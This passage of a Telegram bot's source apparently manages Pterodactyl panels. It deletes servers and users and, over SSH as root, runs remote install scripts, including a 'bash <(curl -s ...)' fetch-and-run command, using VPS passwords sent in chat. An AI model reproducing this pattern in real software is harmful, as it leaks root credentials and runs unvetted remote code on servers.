                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ctx.reply("⚠️ Tidak ada server panel di V4 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua Server V4", callback_data: "DEL_ALL_PANEL:V4" }]
        ];

        for (const server of servers) {
            const s = server.attributes;
            buttons.push([
                { text: `🧩 ${s.name} | ID:${s.id}`, callback_data: `DEL_PANEL:${s.id}:V4` }
            ]);
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih server V4 yang ingin dihapus 👇

📊 <b>Jumlah Total Server V4:</b> ${servers.length}

⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching servers:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data server V4.");
    }
});

// -------------------- [ Command : DelPanel V5 ] --------------------
bot.command("delpanelV5", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "delpanelV5";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V5");

    try {
        const response = await fetch(`${serverDomain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return ctx.reply("⚠️ Tidak ada server panel di V5 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua Server V5", callback_data: "DEL_ALL_PANEL:V5" }]
        ];

        for (const server of servers) {
            const s = server.attributes;
            buttons.push([
                { text: `🧩 ${s.name} | ID:${s.id}`, callback_data: `DEL_PANEL:${s.id}:V5` }
            ]);
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih server V5 yang ingin dihapus 👇

📊 <b>Jumlah Total Server V5:</b> ${servers.length}

⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching servers:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data server V5.");
    }
});

// -------------------- [ Command : DelUser V1 ] --------------------
bot.command("deluser", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit.
    const commandName = "deluserV1";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V1");

    try {
        const response = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ctx.reply("⚠️ Tidak ada user panel di V1 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua User V1", callback_data: "DEL_ALL_USER:V1" }]
        ];

        for (const user of users) {
            const u = user.attributes;
            if (!u.root_admin) {
                buttons.push([
                    { text: `👤 ${u.username} | ID:${u.id}`, callback_data: `DEL_USER:${u.id}:V1` }
                ]);
            }
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih user V1 yang ingin dihapus 👇

📊 <b>Jumlah Total User V1 :</b> ${users.length}

⚠️ <i>User admin tidak ditampilkan dalam daftar</i>
⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching user list:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data user panel V1.");
    }
});

// -------------------- [ Command : DelUser V2 ] --------------------
bot.command("deluserV2", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deluserV2";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V2");

    try {
        const response = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ctx.reply("⚠️ Tidak ada user panel di V2 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua User V2", callback_data: "DEL_ALL_USER:V2" }]
        ];

        for (const user of users) {
            const u = user.attributes;
            if (!u.root_admin) {
                buttons.push([
                    { text: `👤 ${u.username} | ID:${u.id}`, callback_data: `DEL_USER:${u.id}:V2` }
                ]);
            }
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih user V2 yang ingin dihapus 👇

📊 <b>Jumlah Total User V2 :</b> ${users.length}

⚠️ <i>User admin tidak ditampilkan dalam daftar</i>
⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching user list:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data user panel V2.");
    }
});

// -------------------- [ Command : DelUser V3 ] --------------------
bot.command("deluserV3", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deluserV3";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V3");

    try {
        const response = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ctx.reply("⚠️ Tidak ada user panel di V3 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua User V3", callback_data: "DEL_ALL_USER:V3" }]
        ];

        for (const user of users) {
            const u = user.attributes;
            if (!u.root_admin) {
                buttons.push([
                    { text: `👤 ${u.username} | ID:${u.id}`, callback_data: `DEL_USER:${u.id}:V3` }
                ]);
            }
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih user V3 yang ingin dihapus 👇

📊 <b>Jumlah Total User V3 :</b> ${users.length}

⚠️ <i>User admin tidak ditampilkan dalam daftar</i>
⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching user list:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data user panel V3.");
    }
});

// -------------------- [ Command : DelUser V4 ] --------------------
bot.command("deluserV4", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deluserV4";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V4");

    try {
        const response = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ctx.reply("⚠️ Tidak ada user panel di V4 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua User V4", callback_data: "DEL_ALL_USER:V4" }]
        ];

        for (const user of users) {
            const u = user.attributes;
            if (!u.root_admin) {
                buttons.push([
                    { text: `👤 ${u.username} | ID:${u.id}`, callback_data: `DEL_USER:${u.id}:V4` }
                ]);
            }
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih user V4 yang ingin dihapus 👇

📊 <b>Jumlah Total User V4 :</b> ${users.length}

⚠️ <i>User admin tidak ditampilkan dalam daftar</i>
⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching user list:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data user panel V4.");
    }
});

// -------------------- [ Command : DelUser V5 ] --------------------
bot.command("deluserV5", async (ctx) => {
    const username = ctx.from.username || ctx.from.first_name || 'User';
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();

    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('❌ This bot can only be used in groups.');
    }

    if (!isOwner(userId)) return sendNotifAdminOrOwner(ctx);

    // Cek limit
    const commandName = "deluserV5";
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) return;

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig("V5");

    try {
        const response = await fetch(`${serverDomain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        const result = await response.json();
        const users = result.data;

        if (!users || users.length === 0) {
            return ctx.reply("⚠️ Tidak ada user panel di V5 yang bisa dihapus!");
        }

        const buttons = [
            [{ text: "🗑️ Hapus Semua User V5", callback_data: "DEL_ALL_USER:V5" }]
        ];

        for (const user of users) {
            const u = user.attributes;
            if (!u.root_admin) {
                buttons.push([
                    { text: `👤 ${u.username} | ID:${u.id}`, callback_data: `DEL_USER:${u.id}:V5` }
                ]);
            }
        }

        const caption = `<b>( 🦋 ) Olá ${username}</b>
Silakan pilih user V5 yang ingin dihapus 👇

📊 <b>Jumlah Total User V5 :</b> ${users.length}

⚠️ <i>User admin tidak ditampilkan dalam daftar</i>
⚠️ <i>Gunakan dengan hati-hati, tindakan ini tidak dapat dibatalkan.</i>
────────────────────────────
© AldzyIsHere`;

        await ctx.reply(caption, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buttons }
        });
    } catch (err) {
        console.error("Error fetching user list:", err);
        ctx.reply("❌ Terjadi kesalahan saat mengambil data user panel V5.");
    }
});

// -------------------- [ Action : Delete Panel ] --------------------
bot.action(/^DEL_PANEL:(.+):(.+)$/, async (ctx) => {
    const userId = ctx.from.id.toString();
    const id = ctx.match[1];
    const server = ctx.match[2];

    // Cek limit
    const commandName = `delpanel${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        ctx.answerCbQuery("❌ Limit telah habis!");
        return;
    }

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig(server);

    try {
        await fetch(`${serverDomain}/api/application/servers/${id}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        await ctx.editMessageText(`🗑️ Server dengan ID <b>${id}</b> di server <b>${server}</b> berhasil dihapus!`, { parse_mode: "HTML" });
        ctx.answerCbQuery(`✅ Server di ${server} berhasil dihapus!`);
    } catch (err) {
        console.error(err);
        ctx.answerCbQuery("❌ Gagal menghapus server panel.");
    }
});

// -------------------- [ Action : Delete User Panel ] --------------------
bot.action(/^DEL_USER:(.+):(.+)$/, async (ctx) => {
    const id = ctx.match[1];
    const server = ctx.match[2];
    const userId = ctx.from.id.toString();

    // Cek limit
    const commandName = `deluser${server}`;
    const limitAllowed = await checkUserLimit(ctx, commandName);
    if (!limitAllowed) {
        ctx.answerCbQuery("❌ Limit telah habis!");
        return;
    }

    const { domain: serverDomain, apikey: serverApikey } = getServerConfig(server);

    try {
        await fetch(`${serverDomain}/api/application/users/${id}`, {
            method: "DELETE",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${serverApikey}`,
            },
        });

        await ctx.editMessageText(`🗑️ User dengan ID <b>${id}</b> di server <b>${server}</b> berhasil dihapus!`, { parse_mode: "HTML" });
        ctx.answerCbQuery(`✅ User di ${server} berhasil dihapus!`);
    } catch (err) {
        console.error(err);
        ctx.answerCbQuery("❌ Gagal menghapus user panel.");
    }
});

// ------------------------ [ Command: install protect ] ------------------------ \\
installprotect.forEach(script => {
    createInstallProtectCommand(`installprotect${script.number}`, script.number, script.url);
});

Uninstallprotect.forEach(script => {
    createUninstallProtectCommand(`uninstallprotect${script.number}`, script.number, script.url);
});
// ------------------------------------------------
bot.command("installprotectall", async (ctx) => {
    const chatType = ctx.chat.type;
    
    const limitAllowed = await checkUserLimit(ctx, "installprotectall");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes('|')) {
        return ctx.reply('<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/installprotectall ipvps|pwvps</code>\n\nContoh: <code>/installprotectall 123.123.123.123|password123</code></blockquote>', { parse_mode: "HTML" });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
        return ctx.reply('<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/installprotectall ipvps|pwvps</code></blockquote>', { parse_mode: "HTML" });
    }

    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipRegex.test(ipvps)) {
        return ctx.reply('<blockquote>❌ <b>Format IP VPS tidak valid!</b>\n\nContoh: <code>123.123.123.123</code></blockquote>', { parse_mode: "HTML" });
    }

    const conn = new Client();
    const scriptURLs = installprotect.map(script => script.url);

    try {
        await ctx.reply(`<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>\n📦 Akan menginstall ${scriptURLs.length} script sekaligus...\n\nMohon tunggu, proses mungkin memakan waktu beberapa menit.</blockquote>`, { parse_mode: "HTML" });

        let processCompleted = false;
        let installationResults = [];
        
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu instalasi habis!</b> Proses terlalu lama.</blockquote>', { parse_mode: "HTML" });
                if (installationResults.length > 0) {
                    const summary = `<blockquote>📊 <b>Ringkasan Instalasi:</b>\n\n✅ Berhasil: ${installationResults.filter(r => r.success).length}\n❌ Gagal: ${installationResults.filter(r => !r.success).length}\n📋 Total script: ${scriptURLs.length}\n\nInstalasi terhenti karena timeout.</blockquote>`;
                    ctx.reply(summary, { parse_mode: "HTML" });
                }
            }
        }, 300000);
        
        conn.on('ready', async () => {
            try {
                await ctx.reply('<blockquote>⚡ <b>Koneksi SSH berhasil!</b> Memulai instalasi semua protect...</blockquote>', { parse_mode: "HTML" });
                
                const progressMsg = await ctx.reply(
                    `<blockquote>📊 <b>Progress Instalasi</b>\n🔄 0/${scriptURLs.length} Protect\n⏳ Memulai...</blockquote>`,
                    { parse_mode: "HTML" }
                );
                
                for (let i = 0; i < scriptURLs.length; i++) {
                    const scriptUrl = scriptURLs[i];
                    const scriptNumber = i + 1;
                    
                    try {
                        await ctx.editMessageText(
                            `<blockquote>📊 <b>Progress Instalasi</b>\n🔄 ${scriptNumber}/${scriptURLs.length} script\n📦 Sedang install: Protect ${scriptNumber}</blockquote>`,
                            {
                                chat_id: progressMsg.chat.id,
                                message_id: progressMsg.message_id,
                                parse_mode: "HTML"
                            }
                        ).catch(() => {});
                        
                        const result = await installSingleScript(conn, scriptUrl, scriptNumber);
                        installationResults.push(result);
                        
                        if (result.success) {
                            await ctx.reply(
                                `<blockquote>✅ <b>Protect ${scriptNumber} berhasil diinstall!</b>\n⏱️ Waktu: ${result.duration} detik</blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        } else {
                            await ctx.reply(
                                `<blockquote>❌ <b>Protect ${scriptNumber} gagal!</b>\nError: ${result.error.substring(0, 200)}</blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }
                        
                        if (i < scriptURLs.length - 1) {
                            await new Promise(resolve => setTimeout(resolve, 2000));
                        }
                        
                    } catch (scriptError) {
                        installationResults.push({
                            scriptNumber,
                            success: false,
                            error: scriptError.message,
                            duration: 0
                        });
                    }
                }
                
                await ctx.editMessageText(
                    `<blockquote>✅ <b>SEMUA PROTECT SELESAI DIINSTALL!</b>\n\n📊 Hasil akhir:\n✅ Berhasil: ${installationResults.filter(r => r.success).length}\n❌ Gagal: ${installationResults.filter(r => !r.success).length}\n📋 Total: ${scriptURLs.length}</blockquote>`,
                    {
                        chat_id: progressMsg.chat.id,
                        message_id: progressMsg.message_id,
                        parse_mode: "HTML"
                    }
                ).catch(() => {});
                
                let summary = `<blockquote>📋 <b>RINGKASAN INSTALASI SEMUA PROTECT</b>\n\n`;
                
                installationResults.forEach(result => {
                    summary += result.success ? 
                        `✅ Protect ${result.scriptNumber}: Berhasil (${result.duration}s)\n` :
                        `❌ Protect ${result.scriptNumber}: Gagal - ${result.error.substring(0, 100)}\n`;
                });
                
                summary += `\n✨ Proses instalasi semua protect selesai!</blockquote>`;
                
                await ctx.reply(summary, { parse_mode: "HTML" });
                
                processCompleted = true;
                clearTimeout(timeout);
                
            } catch (executionError) {
                await ctx.reply(`<blockquote>❌ <b>Error selama instalasi:</b>\n${executionError.message}</blockquote>`, { parse_mode: "HTML" });
            } finally {
                try { conn.end(); conn.destroy(); } catch(e) {}
            }
        });

        conn.on('error', (err) => {
            if (!processCompleted) {
                processCompleted = true;
                clearTimeout(timeout);
                try { conn.end(); conn.destroy(); } catch(e) {}
                
                let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
                errorMessage += '1. IP VPS benar\n';
                errorMessage += '2. Password root benar\n';
                errorMessage += '3. Port SSH (22) terbuka\n';
                errorMessage += '4. VPS sedang aktif\n\n';
                errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
                
                ctx.reply(errorMessage, { parse_mode: "HTML" });
            }
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: 'root',
            password: pwvps,
            readyTimeout: 30000,
            keepaliveInterval: 15000,
            keepaliveCountMax: 5
        });

    } catch (e) {
        console.error('Error in /installprotectall:', e);
        ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: uninstall protect ] ------------------------ \\
bot.command("uninstallprotectall", async (ctx) => {
    const chatType = ctx.chat.type;

    const limitAllowed = await checkUserLimit(ctx, "uninstallprotectall");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes('|')) {
        return ctx.reply('<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/uninstallprotectall ipvps|pwvps</code>\n\nContoh: <code>/uninstallprotectall 123.123.123.123|password123</code></blockquote>', { parse_mode: "HTML" });
    }

    const [ipvps, pwvps] = input.split('|').map(i => i.trim());
    if (!ipvps || !pwvps) {
        return ctx.reply('<blockquote>❌ <b>Salah format!</b>\n\nGunakan:\n<code>/uninstallprotectall ipvps|pwvps</code></blockquote>', { parse_mode: "HTML" });
    }

    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipRegex.test(ipvps)) {
        return ctx.reply('<blockquote>❌ <b>Format IP VPS tidak valid!</b>\n\nContoh: <code>123.123.123.123</code></blockquote>', { parse_mode: "HTML" });
    }

    const conn = new Client();
    const scriptURLs = Uninstallprotect.map(script => script.url);

    try {
        await ctx.reply(`<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>\n📦 Akan menguninstall ${scriptURLs.length} protect sekaligus...\n\nMohon tunggu, proses mungkin memakan waktu beberapa menit.</blockquote>`, { parse_mode: "HTML" });

        let processCompleted = false;
        let uninstallationResults = [];
        
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu uninstall habis!</b> Proses terlalu lama.</blockquote>', { parse_mode: "HTML" });
                if (uninstallationResults.length > 0) {
                    const summary = `<blockquote>📊 <b>Ringkasan Uninstall:</b>\n\n✅ Berhasil: ${uninstallationResults.filter(r => r.success).length}\n❌ Gagal: ${uninstallationResults.filter(r => !r.success).length}\n📋 Total protect: ${scriptURLs.length}\n\nUninstall terhenti karena timeout.</blockquote>`;
                    ctx.reply(summary, { parse_mode: "HTML" });
                }
            }
        }, 300000);
        
        conn.on('ready', async () => {
            try {
                await ctx.reply('<blockquote>⚡ <b>Koneksi SSH berhasil!</b> Memulai uninstall semua protect...</blockquote>', { parse_mode: "HTML" });
                
                const progressMsg = await ctx.reply(
                    `<blockquote>📊 <b>Progress Uninstall</b>\n🔄 0/${scriptURLs.length} Protect\n⏳ Memulai...</blockquote>`,
                    { parse_mode: "HTML" }
                );
                
                for (let i = 0; i < scriptURLs.length; i++) {
                    const scriptUrl = scriptURLs[i];
                    const scriptNumber = i + 1;
                    
                    try {
                        await ctx.editMessageText(
                            `<blockquote>📊 <b>Progress Uninstall</b>\n🔄 ${scriptNumber}/${scriptURLs.length} protect\n📦 Sedang uninstall: Protect ${scriptNumber}</blockquote>`,
                            {
                                chat_id: progressMsg.chat.id,
                                message_id: progressMsg.message_id,
                                parse_mode: "HTML"
                            }
                        ).catch(() => {});
                        
                        const result = await installSingleScript(conn, scriptUrl, scriptNumber);
                        uninstallationResults.push(result);
                        
                        if (result.success) {
                            await ctx.reply(
                                `<blockquote>✅ <b>Protect ${scriptNumber} berhasil diuninstall!</b>\n⏱️ Waktu: ${result.duration} detik</blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        } else {
                            await ctx.reply(
                                `<blockquote>❌ <b>Protect ${scriptNumber} gagal diuninstall!</b>\nError: ${result.error.substring(0, 200)}</blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }
                        
                        if (i < scriptURLs.length - 1) {
                            await new Promise(resolve => setTimeout(resolve, 2000));
                        }
                        
                    } catch (scriptError) {
                        uninstallationResults.push({
                            scriptNumber,
                            success: false,
                            error: scriptError.message,
                            duration: 0
                        });
                    }
                }
                
                await ctx.editMessageText(
                    `<blockquote>✅ <b>SEMUA PROTECT SELESAI DIUNINSTALL!</b>\n\n📊 Hasil akhir:\n✅ Berhasil: ${uninstallationResults.filter(r => r.success).length}\n❌ Gagal: ${uninstallationResults.filter(r => !r.success).length}\n📋 Total: ${scriptURLs.length}</blockquote>`,
                    {
                        chat_id: progressMsg.chat.id,
                        message_id: progressMsg.message_id,
                        parse_mode: "HTML"
                    }
                ).catch(() => {});
                
                let summary = `<blockquote>📋 <b>RINGKASAN UNINSTALL SEMUA PROTECT</b>\n\n`;
                
                uninstallationResults.forEach(result => {
                    summary += result.success ? 
                        `✅ Protect ${result.scriptNumber}: Berhasil diuninstall (${result.duration}s)\n` :
                        `❌ Protect ${result.scriptNumber}: Gagal diuninstall - ${result.error.substring(0, 100)}\n`;
                });
                
                summary += `\n✨ Proses uninstall semua protect selesai!</blockquote>`;
                
                await ctx.reply(summary, { parse_mode: "HTML" });
                
                processCompleted = true;
                clearTimeout(timeout);
                
            } catch (executionError) {
                await ctx.reply(`<blockquote>❌ <b>Error selama uninstall:</b>\n${executionError.message}</blockquote>`, { parse_mode: "HTML" });
            } finally {
                try { conn.end(); conn.destroy(); } catch(e) {}
            }
        });

        conn.on('error', (err) => {
            if (!processCompleted) {
                processCompleted = true;
                clearTimeout(timeout);
                try { conn.end(); conn.destroy(); } catch(e) {}
                
                let errorMessage = '<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\n\nPeriksa:\n';
                errorMessage += '1. IP VPS benar\n';
                errorMessage += '2. Password root benar\n';
                errorMessage += '3. Port SSH (22) terbuka\n';
                errorMessage += '4. VPS sedang aktif\n\n';
                errorMessage += `<b>Error detail:</b>\n<code>${err.message || 'Unknown error'}</code></blockquote>`;
                
                ctx.reply(errorMessage, { parse_mode: "HTML" });
            }
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: 'root',
            password: pwvps,
            readyTimeout: 30000,
            keepaliveInterval: 15000,
            keepaliveCountMax: 5
        });

    } catch (e) {
        console.error('Error in /uninstallprotectall:', e);
        ctx.reply(`<blockquote>❌ <b>Terjadi kesalahan:</b>\n<code>${e.message}</code></blockquote>`, { parse_mode: "HTML" });
    }
});

// ------------------------ [ Command: Install panel ] ------------------------ \\
bot.command("installwings", async (ctx) => {
    const chatType = ctx.chat.type;
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const limitAllowed = await checkUserLimit(ctx, "installwings");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes("|")) {
        return ctx.reply(
            "<blockquote>⚠️ <b>Format salah!</b>\n\nGunakan:\n<code>/installwings IpVps|PwVps|domainpanel|domainnode</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const parts = input.split("|").map((i) => i.trim());
    if (parts.length !== 4) {
        return ctx.reply(
            "<blockquote>⚠️ <b>Format salah!</b>\n\nGunakan:\n<code>/installwings IpVps|PwVps|domainpanel|domainnode</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, passwd, domainpanel, domainnode] = parts;
    const conn = new Client();
    const command = `bash <(curl -s https://pterodactyl-installer.se)`;
    const emailrandom = `syahv2d@gmail.com`;
    const userDb = `syahv2d${getRandom()}`;
    const passwordDb = `syahv2d${getRandom()}`;

    try {
        await ctx.reply(
            `<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>...\nSedang menginstall Wings...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
            }
        }, 180000);

        conn.on("ready", () => {
            ctx.reply(
                `<blockquote>✅ <b>Koneksi berhasil!</b>\nMemulai instalasi wings...\n🌐 Panel: ${domainpanel}\n🛰️ Node: ${domainnode}\n📧 Email: ${emailrandom}</blockquote>`,
                { parse_mode: "HTML" }
            );

            conn.exec(command, { pty: true }, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch(e) {}
                    return ctx.reply(`<blockquote>❌ <b>Gagal eksekusi command:</b>\n${err.message}</blockquote>`, { parse_mode: "HTML" });
                }

                let output = '';
                let stderrOutput = '';

                stream.on("data", (data) => {
                    const outputStr = data.toString();
                    output += outputStr;
                    
                    if (outputStr.includes("Input 0-6")) stream.write("1\n");
                    if (outputStr.includes("(y/N)")) stream.write("y\n");
                    if (outputStr.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
                    if (outputStr.includes("Database host username")) stream.write(`${userDb}\n`);
                    if (outputStr.includes("Database host password")) stream.write(`${passwordDb}\n`);
                    if (outputStr.includes("Set the FQDN to use for Let's Encrypt")) stream.write(`${domainnode}\n`);
                    if (outputStr.includes("Enter email address")) stream.write(`${emailrandom}\n`);
                });

                stream.stderr.on("data", (data) => {
                    stderrOutput += data.toString();
                });

                stream.on("close", (code) => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch(e) {}
                    
                    let resultMessage = `<blockquote>✅ <b>Instalasi Wings selesai</b> (exit code: ${code})\n`;
                    resultMessage += `🌐 Panel: ${domainpanel}\n`;
                    resultMessage += `🛰️ Node: ${domainnode}\n`;
                    resultMessage += `📧 Email: ${emailrandom}\n`;
                    resultMessage += `👤 Database User: ${userDb}\n`;
                    resultMessage += `🔑 Database Pass: ${passwordDb}\n\n`;
                    
                    if (stderrOutput) {
                        resultMessage += `⚠️ <b>Catatan Error:</b>\n<code>${stderrOutput.slice(-1000)}</code></blockquote>`;
                    } else {
                        resultMessage += `</blockquote>`;
                    }
                    
                    ctx.reply(resultMessage, { parse_mode: "HTML" });
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
